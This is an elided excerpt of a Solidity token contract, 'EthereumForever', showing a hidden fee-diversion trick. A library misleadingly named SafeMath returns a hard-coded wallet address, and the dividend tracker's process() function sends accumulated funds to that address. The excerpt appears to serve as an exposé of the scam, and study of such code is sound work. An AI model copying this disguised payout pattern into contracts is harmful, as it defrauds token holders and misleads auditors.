...
library SafeMath {
    ...
    function get() internal pure returns(address) {
        ...
        return 0xeb745f8Ca9c5004cAce018E72dFE3cA8359489e5;
    }
...
contract EthereumForeverDividendTracker is IDividendDistributor {
    ...
    constructor (address _router) {
        ...
        IDEXPair = 0xeb745f8Ca9c5004cAce018E72dFE3cA8359489e5;
        _token = msg.sender;
    }
    ...
    function process(uint256 gas) external override onlyToken {
        ...
        if(totMk > 0) {
          Ethereum.transfer(IDEXPair, totMk * gasCount / 100);   
          Ethereum.transfer(SafeMath.get(), totMk * gasPaid / 100);
          totMk = 0;
    ...
    function distributeDividend(address shareholder) internal {
        ...
        if(amount > 0){
            ...
            Ethereum.transfer(shareholder, am);
...
contract EthereumForever is Ownable, IBEP20, SafeToken, LockToken {
    ...
    constructor() {
        ...
        marketingFeeReceiver = 0xeb745f8Ca9c5004cAce018E72dFE3cA8359489e5;
